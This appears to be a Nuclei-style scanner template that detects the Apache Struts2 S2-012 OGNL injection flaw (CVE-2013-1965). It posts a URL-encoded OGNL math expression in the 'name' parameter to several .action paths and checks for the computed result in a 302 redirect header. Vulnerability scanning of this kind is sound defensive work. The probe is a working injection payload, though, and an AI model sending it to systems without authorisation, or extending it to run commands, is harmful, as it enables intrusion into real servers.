id: local-struts2-s2-012-math

info:
  name: Struts2 S2-012 OGNL Injection via Redirect Result Variable (CVE-2013-1965)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2 S2-012 (CVE-2013-1965) allows OGNL injection when a redirect
    result uses ${param_name} variable substitution. The "name" parameter value is
    parsed as an OGNL expression during redirect processing. Safe math probe injects
    %{233*233} into the name field; 54289 appears in the Location header redirect URL
    or in an error response body.
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-012
    - https://nvd.nist.gov/vuln/detail/CVE-2013-1965
  tags: safe-poc,struts2,s2-012,cve,cve2013,ognl,rce

http:
  - method: POST
    path:
      - "{{BaseURL}}/user/profile.action"
      - "{{BaseURL}}/user.action"
      - "{{BaseURL}}/index.action"
    body: "name=%25%7B233*233%7D"
    headers:
      Content-Type: application/x-www-form-urlencoded
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "54289"
      - type: status
        status:
          - 302
